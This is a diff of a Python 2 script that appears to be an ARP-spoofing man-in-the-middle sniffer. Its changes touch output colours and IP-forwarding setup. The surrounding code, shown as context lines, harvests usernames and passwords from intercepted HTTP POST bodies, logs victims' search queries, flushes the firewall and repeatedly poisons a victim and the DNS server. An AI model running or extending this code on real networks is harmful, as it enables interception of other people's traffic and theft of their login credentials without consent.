@@ -135,6 +135,9 @@ def URL(pkt):
 			headers = pkt
 			body = ''
 
+#ADD HTML CHECKER THING HERE
+
+
 		header_lines = headers.split(r"\r\n")
 		for l in header_lines:
 			searchHost = re.search('[Hh]ost: ', l)
@@ -188,7 +191,7 @@ def URL(pkt):
 
 		if args.post and post:
 			if body != '':
-				print T+'[+] POST:',url,'HTTP POST load:',body+W
+				print B+'[+] POST:',url,'HTTP POST load:',body+W
 				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
 				password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
 				for x in username:
@@ -217,7 +220,7 @@ def URL(pkt):
 			if searched:
 				searched = searched.group(3)
 				searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
-				print B + '[+] Searched %s for:' % host,searched + W
+				print T + '[+] Searched %s for:' % host,searched + W
 
 	host = None
 	get = None
@@ -279,22 +282,17 @@ except:
 	sys.exit("Could not get MAC addresses")
 
 #Forward packets and flush iptables
-#ADD THIS SOON *********************
-##if not getoutput('cat /proc/sys/net/ipv4/ip_forward') == '1':
-#	Msg('IPv4 forwarding disabled. Enabling..')
-#	tmp = getoutput('sudo sh -c \'echo "1" > /proc/sys/net/ipv4/ip_forward\'')
-#	if len(tmp) > 0:
-#		Error('Error enabling IPv4 forwarding.')
-#		sys.exit(1)
-
-f = open('/proc/sys/net/ipv4/ip_forward', 'r+')
-f.write('1')
-f.close()
+ipfwd = Popen(['cat', '/proc/sys/net/ipv4/ip_forward'], stdout=PIPE, stderr=DN)
+if not ipfwd.communicate()[0] == '1':
+	f = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+	f.write('1')
+	f.close()
+	print '[+] Enabled IP forwarding'
 Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
 Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
 Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
 Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
-print '[+] Enabled IP forwarding and flushed the firewall\n'
+print '[+] Flushed the firewall\n'
 
 def main():
 
@@ -345,7 +343,6 @@ def main():
 		if not DNSsrvr == routerIP:
 			poison(DNSsrvr, victimIP)
 		time.sleep(1.5)
-
 
 if __name__ == "__main__":
 	main()
